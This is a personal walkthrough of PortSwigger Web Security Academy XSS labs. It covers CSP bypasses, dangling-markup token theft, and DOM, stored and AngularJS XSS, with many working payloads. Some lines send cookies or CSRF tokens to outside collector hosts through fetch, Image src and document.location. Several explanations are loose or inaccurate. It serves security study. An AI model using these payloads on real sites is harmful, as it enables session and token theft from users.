Reference: [https://github.com/hatunaa/ctfd/blob/master/web-academy-portswigger/XSS/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP.md](https://github.com/hatunaa/ctfd/blob/master/web-academy-portswigger/XSS/Reflected%20XSS%20with%20AngularJS%20sandbox%20escape%20and%20CSP.md)

* CSP (Content Security Policy) is a security mechanism that helps prevent XSS attacks by specifying which sources of content are allowed.
* CSP rules are defined in the HTTP response headers:

```
Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
```

* `default-src 'self'`
  * resources from the same URL or domain are allowed by default.
* `script-src 'self'`
  * only script from the same URL or domain is allowed.

![](../../../../.gitbook/assets/mediac0bd3cd6-11f2-4d56-8a98-711b1274b92a.png)

![](../../../../.gitbook/assets/media30b686a9-ba79-474c-bdb8-b6e348077114.png)

### Bypass

* Angular JS can have custom event handlers using `$event`.
* `$event` references the object in browser.
* On Chrome, the `path` property of an event object contains an array of elements that triggered the event, ending with the window object.
* This can be used to escape the AngularJS sandbox and execute global functions like `alert()`.

```html
<input id="x" ng-focus="$event.path|orderBy:'(z=alert)(document.cookie)'">
<script> location='https://0ae6007e044a5326817ad99b00fe00b7.web-security-academy.net/?search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27%3E#x'; </script>
```

![](../../../../.gitbook/assets/mediad2275863-dfce-40b8-a203-ed006285b846.png)

## Reflected XSS with event handlers and href attributes blocked

### Analysis

* Use the intruder to know which tags are allowed.
* Reference: [https://hacklido.com/blog/566-reflected-xss-with-event-handlers-and-href-attributes-blocked-portswigger-academy-labs](https://hacklido.com/blog/566-reflected-xss-with-event-handlers-and-href-attributes-blocked-portswigger-academy-labs)
* The animate and svg tag are allowed.
* Using the svg tag and onload events results in events not being allowed.

![](../../../../.gitbook/assets/media7244b7b7-8d19-41df-ab30-6ef15060e310.png)

![](../../../../.gitbook/assets/media16d88b1b-03ab-4953-85df-386f4ade1a7c.png)

### Bypass

```html
<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>Click me</text></a>
```

* The server detects the xlink tag which is similar to `<a>` tag, so need to find a way to use a tag and make SVG payload executable.
* The `xlink=#xss` attribute specifies that target the element with the ID `xss`.
* Have to make animate tag clickable and executable.

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
```

### Payload Explanation

* `<svg>` tag: used for displaying vector-based text, images, etc. in a web page. Here it is working as a container tag.
* In the svg tag we can use elements like `<a>`.
* SVG is used because anything in SVG is not text; it's elements.
* `<a>` tag: anchor tag to create hyperlinks. Also working as the container tag to include the actual malicious code and make it clickable.
* `<animate>` element of `<svg>` tag: used to animate SVG graphics. It also allowed us to change the value of certain attributes which in this case was the `href` attribute of `<a>` tag.
* `<attributeName=href values=javascript:alert(1)>` tag: as stated above, we are modifying the value of `href` indirectly through animate tag. This makes it possible for `<a>` tag to have `href` attribute. Also, the value given for the `href` attribute was `"javascript:alert(1)"`. This will execute and display an alert box.
* `<text x=20 y=20>Click me</text>` tag: this is also an SVG element, used to display the text on the web page. It makes the payload visible so the victim can click on it.
* The `x` and `y` are the size of the font.
* Finally at the end we closed the `<a>` tag using `</a>`.

```html
<svg> <a> <animate attributeName=href values=javascript:alert(1) /> <text x=20 y=20>Click Me</text> </a> </svg>
```

```html
<svg><a><animate attributeName=href values=javascript:alert(1)></animate><text x=20 y=20>clickme</text></a>
```

![](../../../../.gitbook/assets/media4c6bbe2c-e7a1-4018-b706-068fe145a1f6.png)

## Reflected XSS in a JavaScript URL with some characters blocked

### Analysis

* The vulnerability is in back to logs blog because the href attribute is used to execute JS when the link is clicked.

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=5&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:''}).finally(_ => window.location = '/')">Back to Blog</a>
```

* `&` is used to add a new parameter.
* `'}` is used to break out of strings.
* `x=x=>{throw/**/onerror=alert,1337}`
  * Defines a function `x = x` which will throw an error.
  * When the error is thrown, the `onerror` function will set parameter `alert` with `1337`.
* `toString=x`
  * `toString` is used to convert into string so whenever `toString` is called it will execute `x`.
* `window+''`
  * The conversion of `window` to a string calls the overridden `toString` method, thus triggering the alert.
* `,{x:'`
  * Used to complete the code.

![](../../../../.gitbook/assets/mediaf550b486-cccc-42e4-a228-00ae7ae1ad38.png)

![](../../../../.gitbook/assets/media35002ac5-fa3a-4f52-8fdb-09cc96d617d6.png)

### Bypass

```
&'},x=x=>{throw/**/onerror=alert,1337},toString=x,window+'',{x:'
```

![](../../../../.gitbook/assets/mediae81b3831-41c3-47be-b2e4-6bfa94743658.png)

## Reflected XSS protected by very strict CSP, with dangling markup attack

### Home Page

![](../../../../.gitbook/assets/media76ae388c-53b5-41ec-ae5c-f6009104c131.png)

### Login as wiener

![](../../../../.gitbook/assets/media419b263f-abed-4064-8033-157b2c73e603.png)

* In here we can update email.

![](../../../../.gitbook/assets/media45e1ed1e-936c-4d6d-b434-fd8a1c8b82ae.png)

### Burp Suite HTTP history

![](../../../../.gitbook/assets/mediab0985a88-244f-4fe4-beef-8432a82a4d85.png)

* In the updated email, it sends a POST request to `/my-account/change-email` with parameter `email` and `csrf`.
* Additionally CSP (Content Security Policy) is there which is used as a defence mechanism.

```
Request: email=email1%40gmail.com&csrf=ZzZgPWrazSvvz84cURMDSVy8UY8j2eHn

Response: HTTP/2 302 Found
Location: /my-account?id=wiener
Content-Security-Policy: default-src 'self';object-src 'none'; style-src 'self'; script-src 'self'; img-src 'self'; base-uri 'none';
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

* `object-src` and `base-uri` are set to none.
* default-src 'self': by default, allow resources to be loaded only from the same origin as the document.
* object-src 'none': do not allow loading of any plugins or external objects.
* style-src 'self': only allow stylesheets to be loaded from the same origin.
* script-src 'self': only allow scripts to be loaded from the same origin.
* img-src 'self': only allow images to be loaded from the same origin.
* base-uri 'none': do not allow any `<base>` elements to set the base URL for the document.

### Injection point

* The input is reflected to the `<input>` tag.
* Where the dangling markup injection is done.

```
my-account?email="><img src=x onerror=alert(document.domain) x="
```

![](../../../../.gitbook/assets/media087edba2-2034-4340-8477-99bab4df178a.png)

* The CSP blocked the `unsafe-hashes` keyword is present, most likely alert() JavaScript function using CSP directive `script-src` set to `self`.
* The CSP header blocks external scripts and restricts resources to self.
* CSP's base-uri is set to none, we can leverage the `<base>` tag.

According to Hacktrick: [Dangling Markup - HTML scriptless injection | HackTricks](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection)

* CSP is restricted; it can sometimes still exfiltrate data with some user interactions.

![](../../../../.gitbook/assets/media355b00d0-b0cd-4947-a800-3a506e54780c.png)

### Craft Payload

```html
<a href="http://attacker.net/payload.html"><font size="100" color="red">You must click me</font></a>
<base target='
```

* Using exploit server as an attacker website.
* The base tag and target attribute is used to trick the links.
* `<base target='` is an open tag that captures everything that flows until the next single quote is encountered.

### What happens when the link is clicked

* The user clicked is important.
* The user is redirected to the website.
* The base tag and target attribute capture all the subsequent HTML content and this content is stored in `window.name`.

### How the data is exfiltrated

* The attacker page includes the script tab which steals the captured data:

```html
<script>
if (window.name) {
   new Image().src = '//your-collaborator-id.burpcollaborator.net?' + encodeURIComponent(window.name);
}
</script>
```

Exploit server: [https://exploit-0ad600d3033aa52881acb6c9015c00e9.exploit-server.net/](https://exploit-0ad600d3033aa52881acb6c9015c00e9.exploit-server.net/)

### Payload

```
my-account?email="><a href="https://exploit-Number.exploit-server.net/exploit">Click me to update email</a><base target='
```

```
my-account?email="><a href="https://exploit-0ad600d3033aa52881acb6c9015c00e9.exploit-server.net/exploit">Click me to update email to hexruinx</a><base target='
```

![](../../../../.gitbook/assets/mediab23eb2b0-281a-4c46-b835-cc2c6272fbbc.png)

* When the link is clicked, it redirects to our exploit server and exploit payload with the CSRF token there.

### Exploit server to get the exfiltration data

```html
<html>
   <head>
       <title>XSS-29</title>
   </head>
   <body>
       <script>
           if(window.name) {
               new Image().src='//exploit-Number.exploit-server.net/log?'+encodeURIComponent(window.name);
           } else {
               window.location.replace('https://Number.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-Number.exploit-server.net/exploit%22%3EClick%20me%20to%20update%20email%3C/a%3E%3Cbase%20target=%27');
           }
       </script>
   </body>
</html>
```

```html
<html>
   <head>
       <title>XSS-29</title>
   </head>
   <body>
       <script>
           if(window.name) {
               new Image().src='//exploit-0ad600d3033aa52881acb6c9015c00e9.exploit-server.net/log?'+encodeURIComponent(window.name);
           } else {
               window.location.replace('https://0a1f003d03f0a5e18186b75a007800a1.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0ad600d3033aa52881acb6c9015c00e9.exploit-server.net/exploit%22%3EClick%20me%20to%20update%20email%3C/a%3E%3Cbase%20target=%27');
           }
       </script>
   </body>
</html>
```

* Test it: click on Store and View Exploit.

![](../../../../.gitbook/assets/mediad19f61e2-ec7b-4cfa-af7d-20f9b83eabcd.png)

* When clicked, the view exploit HTML code will redirect to our XSS payload.

![](../../../../.gitbook/assets/mediaa4bcd9fb-44ac-470c-a2a3-03255b04e83f.png)

![](../../../../.gitbook/assets/media604870a3-bded-434b-9f0b-cd0db76ef10b.png)

* If the link is clicked, it sends the CSRF token to exploit server visible in access log.

![](../../../../.gitbook/assets/media4f5f90e0-a8ae-463f-836c-0ad78f6486e9.png)

```
103.230.222.204 2024-06-26 18:04:12 +0000 "GET /log?%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cinput%20required%20type%3D%22hidden%22%20name%3D%22csrf%22%20value%3D%22ZzZgPWrazSvvz84cURMDSVy8UY8j2eHn%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%3Cbutton%20class%3D HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36"
```

URL decoded: [URL Decode Online | URLDecoder](https://www.urldecoder.io/)

```
103.230.222.204 2024-06-26 18:04:12 +0000 "GET /log?">

                           <input required type="hidden" name="csrf" value="ZzZgPWrazSvvz84cURMDSVy8UY8j2eHn">

                           <button class= HTTP/1.1" 200 "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.97 Safari/537.36"
```

![](../../../../.gitbook/assets/mediaf9d03d85-434d-4121-82ae-bad3f81686e5.png)

* Now click “Delivery exploit to victim” to capture the victim CSRF token.

![](../../../../.gitbook/assets/media85cf288c-6831-4692-8d0c-0608450efba1.png)

![](../../../../.gitbook/assets/mediadb9d2163-a1a6-4fe4-9d6b-c4d3c5a55a30.png)

![](../../../../.gitbook/assets/mediadbccc57f-60c9-48b3-97c7-d85ea6bb1a2a.png)

![](../../../../.gitbook/assets/media64154e67-d6fa-4a19-a678-211a910038dd.png) ![](../../../../.gitbook/assets/media82303ff4-d375-405f-901b-941cd3827ade.png)

* If we clicked:

![](../../../../.gitbook/assets/media0d8b92b4-cf24-45cf-9ac4-d501be08a51d.png)

![](../../../../.gitbook/assets/media68a120ab-fea4-45ec-841a-a730eabd7868.png)

![](../../../../.gitbook/assets/media894a425b-86c5-4d4f-98ed-812de45734e7.png)

![](../../../../.gitbook/assets/mediae9b31956-6386-4390-93a8-882301206a05.png)

* For some reason the delivery to victim exploit didn’t work, so I looked on the internet which gave me: [Reflected XSS protected by very strict CSP, with dangling markup attack | The Cyber Bolg (skullhat.github.io)](https://skullhat.github.io/posts/reflected-xss-protected-by-very-strict-csp-with-dangling-markup-attack/)
* This trick the HTML:

My ID got changed: [https://0a85006e04819b568435734c0038001e.web-security-academy.net/](https://0a85006e04819b568435734c0038001e.web-security-academy.net/)

[https://exploit-0ae4009e04409bdb84f47245014f004b.exploit-server.net/](https://exploit-0ae4009e04409bdb84f47245014f004b.exploit-server.net/)

```
my-account?email="><a href="https://exploit-0ae4009e04409bdb84f47245014f004b.exploit-server.net/exploit">Click me to update email</a><base target='
```

```
my-account?email=%22%3E%3C/form%3E%3Cform%20class=%22login-form%22%20name=%22evil-form%22%20action=%22https://exploit-0ae4009e04409bdb84f47245014f004b.exploit-server.net/log%22%20method=%22GET%22%3E%3Cbutton%20class=%22button%22%20type=%22submit%22%3E%20Click%20me%20%3C/button%3E
```

![](../../../../.gitbook/assets/mediaf97df4d2-9ac0-462c-92cd-6e4fd2b6100b.png)

* When click on clickme, got the wiener CSRF:

![](../../../../.gitbook/assets/media9b8ecabb-766d-42ea-8325-c7951bfe0bac.png)

* It's visible in URL also:

![](../../../../.gitbook/assets/mediad2941652-cf3c-43b4-80a0-84abe6f16af1.png)

### Delivery the exploit to victim

```html
<script>
location='https://0a85006e04819b568435734c0038001e.web-security-academy.net/my-account?email="></form><form class="login-form" name="evil-form" action="https://exploit-0ae4009e04409bdb84f47245014f004b.exploit-server.net/log" method="GET"><button class="button" type="submit"> Click me </button>';
</script>
```

![](../../../../.gitbook/assets/media7939ada9-e620-45ae-8b4e-c77a7b69de43.png)

* It took me some time to realise it was sending the victim CSRF. I was thinking it was the wiener CSRF.

Victim CSRF: `kYltGsHz07yqJQyERlumGcjKB3c7v1Es`

* Go to the starting wiener change email parameter in Burp `/my-account/change-email` and make a POC using Burp Suite:

```html
<html>

 <!-- CSRF PoC - generated by Burp Suite Professional -->

 <body>

   <form action="https://0a85006e04819b568435734c0038001e.web-security-academy.net/my-account/change-email" method="POST">

     <input type="hidden" name="email" value="hacker&#64;evil&#45;user&#46;net" />

     <input type="hidden" name="csrf" value="kYltGsHz07yqJQyERlumGcjKB3c7v1Es" />

     <input type="submit" value="Submit request" />

   </form>

   <script>

     history.pushState('', '', '/');

     document.forms[0].submit();

   </script>

 </body>
```

## [Reflected XSS](https://portswigger.net/web-security/cross-site-scripting/reflected) protected by [CSP](https://portswigger.net/web-security/cross-site-scripting/content-security-policy), with CSP bypass

### Home Page

![](../../../../.gitbook/assets/mediacf3d393c-61d7-492a-8141-eeb7cac00301.png)

* Input is reflected in web application:

![](../../../../.gitbook/assets/media2e3d3357-18de-46e7-bc92-d6db1017edc2.png)

### CSP enabled in Burp history

![](../../../../.gitbook/assets/media45575abe-ebb7-4270-b15c-3bf812a16405.png)

```
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
X-Frame-Options: SAMEORIGIN
Content-Length: 3154
```

* `script-src` is set to self which means it allows JavaScript to be loaded from the same origin as the page itself.
* `report-uri` directive is the one which reflects the input into the actual policy.
* default-src 'self': only allow resources (scripts, styles, images, etc.) from the same origin.
* object-src 'none': do not allow any plugins (like Flash) to be loaded.
* script-src 'self': only allow scripts from the same origin.
* style-src 'self': only allow styles from the same origin.
* report-uri /csp-report?token=...: send violations of the CSP to the specified URL for logging.
* Chrome introduced `script-src-elem` directive which allows control of script elements but not events. This new directive allows overwriting existing `script-src` directive.

### Payload

```
/?token=;script-src-elem 'unsafe-inline'&search=<script>alert(document.domain)</script>
```

* `/?` is query parameter.
* `token=` is adding token CSP.
* `;script-src-elem 'unsafe-inline'` reduces the security and works like allowing any policy.
* `search` is a query parameter.

![](../../../../.gitbook/assets/mediab9c65d91-bd99-4e89-ad6e-914534e63e4e.png)

Solved

![](../../../../.gitbook/assets/media7a507ff8-3eba-45c9-9d65-8b3f90ccdee9.png)

***

## XSS Stored Lab

## Stored XSS into HTML context with nothing encode

* If it's not handling h1 tags properly then it does the same for JavaScript.

![](../../../../.gitbook/assets/mediaf5e286f9-3834-4117-a687-08bbb8df8127.png)

* Stored a malicious code in database like comment.
* Vulnerable output:

![](../../../../.gitbook/assets/media6d933ed3-509a-434f-bbb4-99b3b6a98921.png)

Break the unsanitized code:

```
">
```

* Img tag which is allowed in CSP.

![](../../../../.gitbook/assets/media10ca699f-fbe5-4b59-b33a-cc8af424ceb9.png)

```
%22%3e%3c%69%6d%67%20%73%72%63%3a%22%68%74%74%70%73%3a%2f%2f%72%6f%62%65%6e%73%69%76%65%2e%69%6e%2f%69%6d%67%22%3e
```

* Inject this code in the injection point which is Shadow.

![](../../../../.gitbook/assets/media774914c4-8689-48de-8d0d-fc2885f53d2f.png)

* As the CSP (Content Security Policy) only allowed localhost img.
* By img tag it can't be redirected, so now using a href tag.

![](../../../../.gitbook/assets/media509f8afd-5948-4047-8dae-23e27e16b813.png)

![](../../../../.gitbook/assets/media8e035a2b-6641-46f0-8c4b-badd9d315f0f.png)

* Let us assume the redirect link is the attacker website where there will be some information on HTTP base URL.
* The HTTP has a base function which has target function.
* Which is when the new tabs open after the user click the links the window has `windows.name` attribute which has base target.

### The flow

* The victim visits the link which attacker control domain where the JS on that page is on the original domain where the XSS dangling attack `" >` then generates the click box, victim interaction is required at this page.
* But assuming that the victim clicks the link, the victim sends back to the original attacker controller domain (attacker website) that the HTTP URL base target used and the function `windows.name` has all the dangling markup which help ending the code including the CSRF.
* Then the victim will send back to the original domain and then the JS trigger.
* If. `new image.src` \[for CSP bypass]
* If `{newimage.src=//attackerlistner ?[?for query] + [concatenation] encodeURLcomponent(window.name)[dangling markup with csrf , method for HTTPURL]`
* After CSRF value is stored then the `else` statement works.
* `else{location=...}` triggers the dangling markup injection and goes the attacker domain to get CSRF.

## Stored XSS into anchor href attribute with double quotes HTML-encoded

## Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

* It action of redirect is using href tag and action is onclick function.

![](../../../../.gitbook/assets/media6826a87b-60c1-488c-90b1-44ce4273a31d.png)

### Events

```
http://rhanihasan/?%-alert(1)-
```

![](../../../../.gitbook/assets/mediaa4926df0-9a14-4609-91b4-5eed4cd27477.png)

* It already using JavaScript in a href and making quotation.

![](../../../../.gitbook/assets/media38f284c1-cd9d-480f-bc6f-23ab0b80551e.png)

## DOM XSS

### DOM Tree

![](../../../../.gitbook/assets/mediab5e7e8f2-6bb9-4d27-a551-afc694db3792.png)

## DOM XSS in document.write sink using source location.search

* The search parameter is being called two times.

![](../../../../.gitbook/assets/media5290a8d3-1597-40e3-9326-f4e455e7b382.png)

![](../../../../.gitbook/assets/media36426b7b-54f5-4d28-a257-c69fc9da3c0c.png)

* So in this code URL search parameters and adding the search parameter in the img src tag.
* So first the query is running by JS then goes to HTML source.
* So break the HTML tags by `"`, then run the action of JavaScript.

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

That code output that search parameter into search query.

### Bypass

![](../../../../.gitbook/assets/media5d4e5f1a-2ea9-42ab-916b-9de06309bf70.png)

![](../../../../.gitbook/assets/media341c84df-4288-4963-ba77-6a1c5b6eb163.png)

### Source Code

![](../../../../.gitbook/assets/media7d1bbc1a-f8e7-4b3a-9023-3fd51ab2afdd.png)

* Uses the HTTP GET methods to query the results.
* There is search query when searched, then it's output with two parameters in source code: one is reflected and second one is in `<img>` tag.
* So the first user input goes into JS which is in `<img>` tag then it goes to HTML source code.
* So the code says it uses function tracker then writes on img tag with path and uses the `window.location.search` parameter to get the user input.

### Vulnerable Output

### Bypass

* It's already in JS but first need to break the img tag using breaker `">` then use the JS action function for malicious purpose:

```
"> onload="alert()"
```

![](../../../../.gitbook/assets/media681c1d2e-f0ea-49f8-97f7-b0c59154ed78.png)

### Brute force Using Burp Suite

![](../../../../.gitbook/assets/media32cf91cc-d381-4a86-b989-c431e16c155b.png) ![](../../../../.gitbook/assets/media86419ce9-1982-477d-bdc4-a3b360456443.png)

## DOM XSS in innerHTML sink using source location.search

* The search query is in the `<span>` HTML tag and has a JavaScript id=`seachmeassage` which is called in the JavaScript function with adding `.innerHTML` which replace the HTML tags into elements/strings.
* The script tag is sanitized by innerHTML function which replaces the HTML content into HTML elements.
* In short the script tag will not execute in innerHTML.

### Normal Output

![](../../../../.gitbook/assets/media40af818c-36d4-4347-84f3-d4ec714ccaa9.png)

![](../../../../.gitbook/assets/mediad19128f7-ac1a-4efa-9aab-fa55815b92a4.png)

### Vulnerable Output

![](../../../../.gitbook/assets/mediad19128f7-ac1a-4efa-9aab-fa55815b92a4.png)

![](../../../../.gitbook/assets/mediaa82f1251-25a9-44a1-88f3-cf83cb43b02f.png)

* To get out of the `<span>` HTML tags, use the `<img src>` which responds in the new HTML tags and add the JavaScript onerror because the img is not stored in web application so the browser results in error which triggers the onerror JavaScript.

```html
<img src="x" onerror=alert(10)>
```

## DOM XSS in document.write sink using source location.search inside a select element

![](../../../../.gitbook/assets/media23fd2881-10f6-498a-9d9b-f9e6b6ede95e.png)

* Add parameter to URL `product?productId=1&storeId=kek` and check out it is in dropdown on the product site.
* Check HTML code and find out that storeId is in `<select>` tag.
* Create the next payload:

```
storeId=kek"></select><script>alert(1)</script>
```

![](../../../../.gitbook/assets/media3fd3574a-fda7-45bb-bbe6-3ec9f2af5de5.png)

[https://0a0b0018034b040a811598ee00cf0012.web-security-academy.net/product?productId=3\&storeId=test123](https://0a0b0018034b040a811598ee00cf0012.web-security-academy.net/product?productId=3\&storeId=test123)

* JavaScript cannot execute directly because it is in the HTML selector tags.
* Closing the brackets `">` then closing the select tag `</select>` then using the img tag to get the error `<img src=x>` and using the onerror function to call out alert function.

```
https://0a0b0018034b040a811598ee00cf0012.web-security-academy.net/product?productId=3&storeId="></select><img src=x onerror=alert()>
```

![](../../../../.gitbook/assets/media49fe6175-7b42-4c00-9319-6c431796c99b.png)

## DOM XSS in jQuery anchor href attribute sink using location.search source

* In the submit page this is a action after submitting to go back to home page.

![](../../../../.gitbook/assets/media30724655-560b-4ab6-a842-f63b071021fe.png)

* After `/` in a href HTML tags the script returns to home page.

![](../../../../.gitbook/assets/mediaf4e76b00-5ad2-4290-b432-b4afb65b800d.png)

![](../../../../.gitbook/assets/mediab817779b-4959-4d69-87e4-fa7eda502cb5.png)

## DOM XSS in jQuery selector sink using a hashchange event

* The `#` is used for bookmarks.

![](../../../../.gitbook/assets/mediacfa89121-170f-4db4-b0ba-480f75f00bfc.png)

![](../../../../.gitbook/assets/mediac342ac00-14d1-4970-86fa-1e4d92d07547.png)

* When there is `hashchange` event, it redirects into `window.location.hash`.
* So `window.location.hash` is doing when it goes direct into the header of blogs, like `https://webapplication.com/`

![](../../../../.gitbook/assets/mediaccfa637f-caa5-400b-aa88-b61db3e80a37.png)

```javascript
$(window).on('hashchange', function() {
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
  if (post) post.get(0).scrollIntoView();
});
```

* Then it goes to `<h2>` tags in HTTP post method.
* It uses jQuery function to auto scroll to the title that is passed in `#` via `location.hash` and looks for `h2` tag in `section.blog-list`.
* This code listens for changes in URL and looks for title `h2` which match with after hash string.
* If it found one it will auto scroll to that.

### Events / Vulnerable Output

```html
<img src=x onerror=alert(document.domain)>
```

![](../../../../.gitbook/assets/media39c7e1ad-9314-4699-be76-f3a7d044d431.png)

Send it to victim:

```html
<iframe src="https://website/#" onload="this.src+='<img src=x onerror=print()>'"></iframe><br>
```

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

* Angular is used for application building; it basically helps get new data from the server to the client.
* `$` is nothing but a prefix that the JavaScript is being and helps to keep the namespace clean.

![](../../../../.gitbook/assets/media57e944fe-b840-4c56-9f80-fbdd0ee2236d.png)

* `$` is there for continuing the code.
* Constructor is a function and function is a blackbox in short; it's module place one place to another.
* Using the constructor it can dynamically create and execute the code.
* It doesn’t work using the function tags because of Angular JS security.

![](../../../../.gitbook/assets/mediacc5440d4-6b3e-4106-9e96-7ca99f469878.png)

### Exploit

```
{{constructor.constructor('alert(1)')()}}
```

### Adapted version

```
{{constructor.constructor('document.location="http://burp.oastify.com?c="+document.cookie')()}}
```

## DOM XSS Reflected

### Analysis

```html
<script>search('search-results')</script>
<section class="blog-header">
  <h1>0 search results for 'hexruinx'</h1><hr></section>
```

```javascript
function search(path) {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      eval('var searchResultsObj = ' + this.responseText);
      displaySearchResults(searchResultsObj);
    }
  };
}
```

* [https://0abf00dc032c1d6f81db482400e90086.web-security-academy.net/resources/js/searchResults.js](https://0abf00dc032c1d6f81db482400e90086.web-security-academy.net/resources/js/searchResults.js)
* Eval function.
* When the request is completed, the eval is work is to response in JSON format.

### Response

```
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 38
{"results":[],"searchTerm":"hexruinx"}
```

* The `EVAL` is being used.

### Bypass

* So the response is in JSON and the eval is used, it can be broken out of JSON and malicious JS will work.

```
\
```

* Escaping the double quote and JSON will add `\\` act as an opening JSON object.
* `-alert(1)`
  * It breaks from string and HTML tags and calls the JS function.
* `}//`
  * Acts as a closing JSON object.

```
\"-alert()}//
```

### Adapted version

```
\"-fetch('http://rhanihasan?c='+btoa(document.cookie))}//
```

## Stored XSS DOM

### Analysis

* As per the blog the comment section is vulnerable.

```html
<p><a id="author" href="https://example.com"></a>name1 | 24-06-2024<img class="avatar" src="/resources/images/avatarDefault.svg"></p>
```

* Use the img src tag to break from HTML but fail.

```html
"><img src=x onerror=alert()>
```

```html
<section class="comment"><p><a id="author" href="https://example.com"></a>"><img src=x onerro=alert()> | 24-06-2024<img class="avatar" src="/resources/images/avatarDefault.svg"></p><p>"><img src=x onerro=alert()></p><p></p></section>
```

* Both brackets are being replaced.

```javascript
function escapeHTML(html) {
  return html.replace('<', '<').replace('>', '>');
}
```

### Bypass

```html
<><img src=x onerror=alert()>
```

```html
<section class="comment"><p><a id="author" href="https://example.com"></a><><img src="x" onerror="alert()"> | 24-06-2024<img class="avatar" src="/resources/images/avatarDefault.svg"></p><p><><img src="x" onerror="alert()"></p><p></p></section>
```

![](/broken/files/e362a4c375854f95a9fa2f68f36ed5bc095f3d29)

## Reflected XSS into HTML context with most tags and attributes blocked

![](../../../../.gitbook/assets/media8ae941e1-17ed-4b66-a717-63703727ef07.png)

* The body tags are allowed; using the body tags use the URL space encoding which is `%20` and events `$$ = 1`.

### Brute Force Results for Events

![](../../../../.gitbook/assets/mediaec0e4cb8-5a6a-464f-9cb9-330441099971.png)

## DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

* Angular JS is built by Google, helps to build dynamic and interactive web application by adding new attributes and elements; this is called directive and helps HTML more powerful to break.
* Expression is Angular function which used to add data in HTML like `{{ 2 + 2 }}` will be replaced with `4`.

### Analysis

* Got the `<body ng-app>`:

![](../../../../.gitbook/assets/media1193c5fb-e847-4c11-890a-3e64dcafed0a.png)

* Did not break the h1 tag.

![](../../../../.gitbook/assets/media029bd31a-d3c2-4f61-976c-edc280fdcfa6.png)

Hypean:

![](../../../../.gitbook/assets/media98c409a5-8506-49fc-bb8e-81bbd6bfeae3.png)

### Payload

```html
{{ $on.constructor('alert(1)')() }}
```

![](../../../../.gitbook/assets/mediae8c6cb44-6974-43b6-af08-d8908ba214a3.png)

## Reflected XSS with some SVG markup allowed

![](../../../../.gitbook/assets/media71897e8f-53dc-44d7-ab30-77d537cdc058.png)

### Results of brute force

![](../../../../.gitbook/assets/media3641a4a5-19c4-48a8-81df-213eb1cb9eb4.png)

![](../../../../.gitbook/assets/mediac9ed5e63-a789-4084-b026-e894780d0cf5.png)

## Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

### Checked the sanitization with some payload

```html
<section class=blog-header>

    <h1 id="searchMessage"></h1>

    <script>

        var message = `0 search results for '\u0022\u003e \u003cimg src=x onerror=alert(1)\u003e'`;

        document.getElementById('searchMessage').innerText = message;

    </script>

    <hr>

</section>
```

### Analysis

* Checking with payload:

```html
<section class=blog-header> <h1 id="searchMessage"></h1> <script> var message = `0 search results for '\u0022\u003e \u003cimg src=x onerror=alert(1)\u003e'`; document.getElementById('searchMessage').innerText = message; </script> <hr> </section>
```

* Breakdown of the JavaScript Template Literal:
  * `var message = \`0 search results for '\u0022\u003e \u003cimg src=x onerror=alert(1)\u003e'\`;\`
  * This line uses a template literal to assign a string to the message variable.
  * `\u0022` is `"`.
  * `\u003e` is `>`.
  * `\u003c` is `<`.
  * The rest of the characters are part of a typical XSS payload (`<img src=x onerror=alert(1)>`).
* Setting `innerText`:
  * `document.getElementById('searchMessage').innerText = message;`
  * This line sets the inner text of the element with the ID `searchMessage` to the value of the message variable.
* Impact of escaping:
  * The escaping ensures that the special characters are rendered as text rather than being interpreted as HTML or JavaScript.
  * This is a common technique to prevent XSS attacks.
* Enter the random alphabetical string and it sent to `<script>` tag.

![](../../../../.gitbook/assets/mediaef0ed8cb-23e2-46ca-8684-45ab3cb1fa60.png)

* `$` is symbol meaning that the JavaScript is still continuing and the same goes for `{}`.

```
4{alert(document.domain)}
```

### Bypass

* Payload suggested by ChatGPT:

```
${alert(1)}
```

* This allows exiting JS string and executing JS.

```html
<section class="blog-header"> <h1 id="searchMessage">0 search results for 'undefined'</h1> <script> var message = `0 search results for '${alert(1)}'`; document.getElementById('searchMessage').innerText = message; </script> <hr> </section>
```

![](../../../../.gitbook/assets/media45032ffc-0826-4f1a-a195-8884343b0418.png)

![](../../../../.gitbook/assets/media41694722-65c3-4e6e-9bab-fc2e24e2e4f7.png)

## Exploiting cross-site scripting to steal cookies

* Unable to have access of Burp Collaborator.
* So using the malicious code the victim will post the cookie in comments.
* So every POST and its POST\_ID.

